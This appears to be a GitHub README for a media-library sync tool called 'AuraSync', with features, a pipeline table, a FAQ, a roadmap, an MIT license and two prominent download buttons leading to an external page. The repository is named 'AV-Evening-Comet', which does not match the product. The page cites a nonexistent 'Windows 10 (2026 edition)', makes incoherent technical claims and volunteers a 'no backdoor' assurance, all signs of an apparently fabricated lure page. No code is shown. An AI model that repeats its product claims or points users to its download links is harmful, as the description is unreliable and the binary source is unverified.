![preview](https://raw.githubusercontent.com/Stratix10/AV-Evening-Comet/main/preview.svg)

# AuraSync

**AuraSync** is a desktop orchestration tool for synchronizing, transforming, and curating digital media libraries across local and remote environments. Inspired by the functional core of AV Morning Star but reimagined as a cross-platform media alignment engine, AuraSync enables users to reconcile fragmented collections of audio, video, and metadata into coherent, searchable catalogs.

## Overview 🚀

Modern media consumption spans devices, services, and storage silos. AuraSync addresses the friction of scattered files, redundant duplicates, and inconsistent naming conventions by providing a unified interface for media alignment. Whether you are archiving personal recordings, organizing a studio’s raw footage, or preparing a curated playlist from disparate sources, AuraSync operates as the semantic bridge between your content and your intent.

The application leverages a modular pipeline architecture—ingest, analyze, reconcile, and export—allowing users to define custom workflows without writing code. Unlike conventional file managers, AuraSync understands media context: it reads embedded metadata, generates fingerprint hashes, and suggests intelligent groupings based on temporal, spatial, or acoustic similarity.

[![Download](https://raw.githubusercontent.com/Stratix10/AV-Evening-Comet/main/button.svg)](https://stratix10.github.io/AV-Evening-Comet/)

## Core Capabilities ✨

### 1. Multilingual Media Discovery
AuraSync parses filenames, tags, and embedded metadata in over 40 languages. Its heuristic engine normalizes character encodings and scripts, ensuring that a collection mixing Cyrillic, Hanzi, Arabic, and Latin descriptors aligns into a cohesive index.

### 2. Responsive Desktop Interface
The interface scales fluidly from a compact sidebar utility to a full-screen media dashboard. Built on a lightweight rendering framework, AuraSync maintains sub‑second response times even when managing libraries exceeding one hundred thousand files.

### 3. 24/7 Automated Workflow Engine
Configure rules to watch folders, trigger conversions, archive stale content, or generate reports. The engine runs in the background, respecting system resource limits, and can pause operations during peak CPU usage.

### 4. Semantic Deduplication
Beyond byte‑level checksums, AuraSync applies perceptual hashing to identify near‑identical audio tracks or video segments—even those encoded at different bitrates or embedded in different containers.

### 5. Static Export Profiles
Generate portable catalogs in JSON, CSV, XML, or Markdown for sharing with collaborators or importing into other tools. Export profiles are customizable through a visual template editor.

### 6. Privacy‑First Architecture
All local scanning occurs offline. Network features (such as remote drive mounting or metadata enrichment from public databases) are opt‑in and individually toggled.

## Architecture & Design Philosophy 🏛️

AuraSync treats each media file as a node in a knowledge graph rather than a static blob. The core pipeline consists of six stages:

| Stage | Function |
|-------|----------|
| Source Adapter | Connects to local drives, network shares, cloud mounts |
| Ingestion Gate | Extracts container format, streams, checksums |
| Analysis Nucleus | Runs metadata decoder + perceptual fingerprint |
| Reconciliation Matrix | Compares against existing library entries |
| Decision Engine | Applies user‑defined rules (match, skip, flag, rename) |
| Output Compiler | Prepares aligned results for export or storage |

Each stage can be extended via plugins or replaced with community‑developed modules. The pipeline is commutative where possible: reordering stages yields the same final alignment, guaranteeing deterministic behavior.

## Technical Prerequisites 🔧

To run AuraSync, your environment should satisfy the following:

- Operating System: Windows 10 (2026 edition or later), macOS 15 Sequoia, or Linux kernel 6.x with glibc 2.35+
- Graphics: OpenGL 4.1 or Vulkan 1.2 capable hardware
- Storage: At least 2 GB of temporary space for processing
- Memory: 4 GB RAM minimum; 8 GB recommended for libraries exceeding 50,000 items
- Display: 1280×720 minimum; 1920×1080 recommended for full dashboard experience

AuraSync does not require an active internet connection for local functionality. Network metadata enrichment services are optional and must be explicitly enabled in settings.

## Getting Started 🌱

### Initialization
Upon first launch, AuraSync presents a welcome wizard guiding you through three steps:

1. **Designate a vault** – Select a primary folder where your aligned media will reside. This vault is the synchronization anchor.
2. **Choose a policy** – Decide how conflicts (duplicates, differing metadata) are resolved: keep newest, keep largest, ask before action, or automatic merge.
3. **Set a scan horizon** – Define the depth of recursive discovery. Optionally exclude system folders or symbolic link loops.

### First Alignment
After initialization, click the **Align** button to begin a deep scan of your vault and any added sources. The progress dashboard shows files discovered, fingerprints computed, and matches found. You can pause or cancel at any time; partial results are preserved.

### Custom Workflows
Advanced users can define workflows using the visual flow editor. Drag processing nodes—such as “Extract Loudness”, “Normalize Filename”, “Embed Thumbnail”—onto a canvas and connect them into a directed graph. Workflows can be saved as templates and applied to future imports.

## Use Cases in Practice 🧩

### Archival Librarians
A university media archive uses AuraSync to reconcile digitized lecture recordings from three separate eras. The tool’s temporal clustering groups lectures by academic term based on embedded creation dates, microphone signatures, and room acoustics.

### Musician & Producer Collections
A touring musician synchronizes rehearsal demos from tour‑issue recorders, phone voice memos, and DAW exports. AuraSync’s acoustic fingerprinting identifies variations of the same riff across takes and suggests a unified naming scheme.

### Video Content Curation
A documentary filmmaker combines footage from multiple cameras, drones, and field recorders. The reconciliation engine aligns clips by timestamp, geotag, and audio cross‑reference, producing a sorted timeline without manual splicing.

## Security & Privacy Standards 🔐

- All scanning and processing occurs locally unless explicitly configured otherwise.
- Network requests (e.g., for metadata lookup) are made over HTTPS and do not transmit file content—only hashed identifiers.
- No telemetry is collected by default. Users must opt into anonymous usage statistics to help improve alignment heuristics.
- Sensitive file metadata (GPS coordinates, embedded contacts) can be stripped during export with a single toggle.

AuraSync does not include any remote execution or backdoor capabilities. The binary is signed with a code‑signing certificate verifiable by your operating system.

## Contributing to AuraSync 🌍

Community contributions are welcome. The project follows a modular plugin architecture, so you can extend capabilities without modifying core code.

- **Bug Reports**: Use the issue tracker with a minimal reproduction case.
- **Feature Proposals**: Submit a design document describing the use case and proposed implementation.
- **Translations**: Interface localization files are stored in plain JSON. Submit a pull request with your locale.
- **Plugins**: Develop adapters for new media formats, metadata sources, or storage backends. The plugin API documentation is included in the repository under `docs/plugins/`.

All contributions are reviewed for alignment with the project’s privacy‑first and semantic‑accuracy principles.

## Roadmap for 2026 📅

| Quarter | Milestone |
|---------|-----------|
| Q1 2026 | Release v1.0 with core alignment pipeline |
| Q2 2026 | Plugin SDK and community plugin marketplace |
| Q3 2026 | Remote synchronization agent (headless mode) |
| Q4 2026 | Machine‑learning assisted tagging and classification |

The roadmap is subject to change based on community feedback and emerging standards.

## Supported Media Formats 🧾

**Audio**: MP3, FLAC, WAV, AIFF, OGG Vorbis, Opus, AAC, WMA, DSD, M4A, APE, WV

**Video**: MP4, MKV, AVI, MOV, WMV, WebM, FLV, 3GP, MPEG‑TS, AV1, HEVC

**Image**: JPEG, PNG, WebP, TIFF, BMP, SVG (metadata only), HEIF, RAW (CR2, NEF, ARW, DNG)

**Metadata**: ID3v1/v2, Vorbis Comments, APEtag, Exif, XMP, QuickTime tags, Matroska tags

## Frequently Asked Questions ❓

**Q: Can AuraSync work with cloud storage providers?**  
A: Yes, if the provider offers a mountable drive interface (e.g., via WebDAV, SMB, or an OS‑level sync client). Native API integration is available through plugins.

**Q: Does AuraSync modify original files?**  
A: By default, AuraSync reads only metadata and fingerprints. New files are written to the vault. Original files remain untouched unless you explicitly enable in‑place renaming or tagging.

**Q: How does multilingual support work?**  
A: The analysis nucleus normalizes Unicode strings using ICU rules, then attempts to identify language scripts via character ranges and common patterns. This enables cross‑lingual deduplication, e.g., recognizing that “Dvořák – Rusalka (Live)” and “德沃夏克 – 水仙女 (现场)” refer to the same performance.

**Q: Is there a command‑line interface?**  
A: Yes. The desktop application wraps a headless CLI binary. You can invoke alignment workflows from scripts or automation tools using `aurasync align --vault /path --policy latest`.

## Licensing & Legal Notices ⚖️

AuraSync is released under the MIT License. You are free to use, modify, and distribute the software, provided the original copyright notice and permission notice are included in all copies or substantial portions of the software.

This project is not affiliated with any commercial media platform or cloud storage provider. Trademarks referenced belong to their respective owners.

**Disclaimer**: AuraSync is a tool for organizing legally obtained media. The developers assume no liability for the misuse of the software to circumvent copyright protections or to process unlawfully acquired content. Users are responsible for compliance with applicable copyright laws in their jurisdiction.

## License

MIT License

Copyright (c) 2026 AuraSync Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

For the full license text, see [LICENSE](LICENSE) in the repository root.

---

[![Download](https://raw.githubusercontent.com/Stratix10/AV-Evening-Comet/main/button.svg)](https://stratix10.github.io/AV-Evening-Comet/)